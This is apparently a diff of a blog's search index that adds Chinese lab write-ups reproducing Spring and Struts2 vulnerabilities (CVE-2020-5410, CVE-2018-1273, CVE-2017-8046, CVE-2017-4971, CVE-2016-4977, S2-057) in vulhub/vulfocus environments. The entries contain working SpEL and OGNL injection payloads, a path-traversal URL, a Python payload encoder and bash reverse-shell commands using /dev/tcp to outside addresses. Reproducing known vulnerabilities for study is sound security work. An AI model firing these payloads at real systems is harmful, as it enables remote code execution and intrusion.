@@ -98,6 +98,146 @@
       </tags>
   </entry>
   <entry>
+    <title>Spring Cloud Config 目录穿越漏洞复现（CVE-2020-5410）</title>
+    <url>/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-5410%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。<br>近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.2.x&lt;=2.2.2 2.1.x&lt;=2.1.8</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocus启动漏洞环境</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092923.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<br><code>http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development</code></p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092924.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</title>
+    <url>/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20Commons%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1273%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)</p>
+<p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p>
+<p>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</p>
+<p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
+<p>已不支持的旧版本</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2018-1273&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>稍等一会，环境启动后，访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092917.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>填写信息，点击<code>Register user</code> 然后抓包</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092918.png" alt="image"></p>
+<p>修改<code>username</code>参数POC并发包:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092919.png" alt="image"></p>
+<p>进入docker容器查看：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092920.png" alt="image"></p>
+<p>修改poc为反弹shell：<br>还是先base64编码，再url编码后发包:</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092921.png" alt="image"></p>
+<p>反弹shell成功：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092922.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Data REST PATCH 请求代码执行漏洞复现（CVE-2017-8046）</title>
+    <url>/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Data%20REST%20PATCH%20%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-8046%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。</p>
+<p>恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3</p>
+<p>可以查看spring-data-rest-webmvc jar包的版本</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-8046&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>等待环境启动完成，然后访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。</a></p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092912.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用<code>PATCH</code>请求来修改之：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATCH &#x2F;customers&#x2F;1 HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>ouch /tmp/success</code>。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092913.png" alt="image"></p>
+<p>然后进入容器<code>docker exec -it 容器id /bin/bash</code>看看：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092914.png" alt="image"></p>
+<p>制作反弹shell的POC:</p>
+<p>命令：<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/7777 0&gt;&amp;1</code></p>
+<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a>：<code>bash -c &#123;echo,YGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNzc3NyAwPiYxYA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<p>通过下面的python代码将每个字符转为对应的十进制：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; b&#39;这里填poc&#39;</span><br><span class="line">bytecode &#x3D; &#39;,&#39;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092915.png" alt="image"></p>
+<p>重新发包修改为反弹shell的poc：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092916.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</title>
+    <url>/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20WebFlow%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-4971%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-4971&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>等待环境启动后，访问<code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是<code>spring-webflow</code>官方给的简单示例。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092905.png" alt="image"></p>
+<p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Proceed”（从这一步，其实WebFlow就正式开始了）：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092906.png" alt="image"></p>
+<p>再点击确认“Confirm”，此时抓包：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092907.png" alt="image"></p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092908.png" alt="image"></p>
+<p>我们向其中添加一个字段（也就是反弹shell的POC）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure>
+
+<p>把反弹shell的POC进行URL编码</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092909.png" alt="image"></p>
+<p>重放数据包</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092910.png" alt="image"></p>
+<p>成功反弹shell</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092911.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Security OAuth2 远程命令执行漏洞复现（CVE-2016-4977）</title>
+    <url>/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-4977%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 </p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2016-4977&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>启动完成后，访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:8080/即可看到web页面。</a></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Security OAuth 2.3到2.3.2</p>
+<p>Spring Security OAuth 2.2到2.2.1</p>
+<p>Spring Security OAuth 2.1到2.1.1</p>
+<p>Spring Security OAuth 2.0到2.0.14</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092901.png" alt="image"></p>
+<p>对反弹shell的POC进行base64编码<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092902.png" alt="image"></p>
+<p>使用<code>poc.py</code>生成反弹shell的POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">message &#x3D; input(&#39;Enter message to encode:&#39;)</span><br><span class="line"></span><br><span class="line">poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc +&#x3D; &#39;)&#125;&#39;</span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092903.png" alt="image"></p>
+<p>监听反弹shell，并访问URL<code>http://your-ip:8080/oauth/authorize?response_type=上面的那一长串POC&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092904.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ThinkPHP 2.x 任意代码执行漏洞复现</title>
     <url>/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>ThinkPHP 2.x版本中，使用 <strong>preg_replace</strong> 的 <strong>/e</strong> 模式匹配路由：</p>
@@ -953,14 +1093,16 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
 <a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
-<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+</li>
 </ol>
 ]]></content>
       <categories>
@@ -996,26 +1138,6 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
-<a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
-</li>
-<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-048 CVE-2017-9791复现过程</title>
     <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
@@ -1033,6 +1155,24 @@
 
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p>
 <p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
+<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
+</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1062,6 +1202,28 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
     <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
@@ -1075,28 +1237,6 @@
 
 <ol start="3">
 <li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
-</li>
 </ol>
 ]]></content>
       <categories>
